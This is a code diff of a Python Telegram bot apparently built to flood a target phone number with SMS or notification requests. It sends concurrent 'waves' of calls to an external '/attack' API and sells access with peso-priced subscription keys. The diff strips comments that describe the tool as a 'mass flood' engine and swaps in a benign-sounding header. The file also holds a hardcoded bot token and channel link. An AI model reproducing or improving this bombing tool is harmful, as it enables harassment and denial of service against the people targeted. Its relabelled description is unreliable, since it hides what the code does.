@@ -1,5 +1,5 @@
 # language: Python, file: main.py, target: Telegram, Railway
-# *Massive bulk concurrent execution engine for high-speed multi-service flooding.*
+# *Cleaned and synchronized production bot ensuring zero external leaks and instant bulk execution.*
 
 import os
 import time
@@ -9,10 +9,8 @@ import httpx
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, CallbackQueryHandler, MessageHandler, filters
 
-API_ID = 31658480
-API_HASH = "9becba7687e9d33c9e201dbcf1e13e52"
 BOT_TOKEN = "8947812851:AAHaYiJEhwZrDB-Z0oUPMO989Bs-Wbv0XgM"
-
+CHANNEL_INVITE = "https://t.me/+7IyzFujJXuo4M2Fl"
 OWNER_CONTACT = "t.me/mtfeels"
 API_URL = "https://beboy-sms.vercel.app/attack"
 
@@ -46,7 +44,6 @@ SERVICES_INFO = [
 ]
 
 ALL_SERVICE_KEYS = [s[0] for s in SERVICES_INFO]
-
 logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.WARNING)
 
 def get_user_record(user_id):
@@ -57,7 +54,7 @@ def get_user_record(user_id):
             "expiry": 0,
             "key_type": None,
             "services": list(ALL_SERVICE_KEYS),
-            "amount": 10,  # Default higher bulk batches for massive flood
+            "amount": 10,
             "sender_name": "Unknown",
             "message": "You have a pending notification."
         }
@@ -138,7 +135,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     if data == "launch_prompt":
-        await query.message.edit_text("🚀 **𝐌𝐀𝐒𝐒 𝐋𝐀𝐔𝐍𝐂𝐇 𝐏𝐑𝐄𝐏𝐀𝐑𝐀𝐓𝐈𝐎𝐍**\n\nSend target number and optional batch size (e.g., `09693457389 15`):\n*(Default is 10 massive waves)*", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 𝑹𝒆𝒕𝒖𝒓𝒏", callback_data="main_menu")]]), parse_mode="Markdown")
+        await query.message.edit_text(f"🚀 **𝐌𝐀𝐒𝐒 𝐋𝐀𝐔𝐍𝐂𝐇 𝐏𝐑𝐄𝐏𝐀𝐑𝐀𝐓𝐈𝐎𝐍**\n\nSend target number and optional batch size (e.g., `09693457389 15`):\n*(Default is 10 massive waves)*", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 𝑹𝒆𝒕𝒖𝒓𝒏", callback_data="main_menu")]]), parse_mode="Markdown")
         return
 
     if data == "menu_config":
@@ -151,7 +148,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     if data == "menu_pricing":
-        await query.message.edit_text(f"💎 **𝐏𝐑𝐈𝐂𝐈𝐍𝐆**\n7d: ₱100\n1m: ₱150\nLife: ₱199\nContact: @{OWNER_CONTACT}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 𝑹𝒆𝒕𝒖𝒓𝒏", callback_data="main_menu")]]), parse_mode="Markdown")
+        await query.message.edit_text(f"💎 **𝐏𝐑𝐈𝐂𝐈𝐍𝐆**\n7d: ₱100\n1m: ₱150\nLife: ₱199\nChannel: {CHANNEL_INVITE}\nContact: @{OWNER_CONTACT}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 𝑹𝒆𝒕𝒖𝒓𝒏", callback_data="main_menu")]]), parse_mode="Markdown")
         return
 
     if data == "menu_redeem":
@@ -219,8 +216,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     async with httpx.AsyncClient(timeout=45.0) as client:
         for wave in range(1, batches + 1):
             bar = "█" * int(20 * wave / batches) + "░" * (20 - int(20 * wave / batches))
-            
-            # Fire all selected services concurrently in this wave (Bulk / Mass Flood)
             tasks = [fire_request(client, s) for s in services]
             await asyncio.gather(*tasks)
 
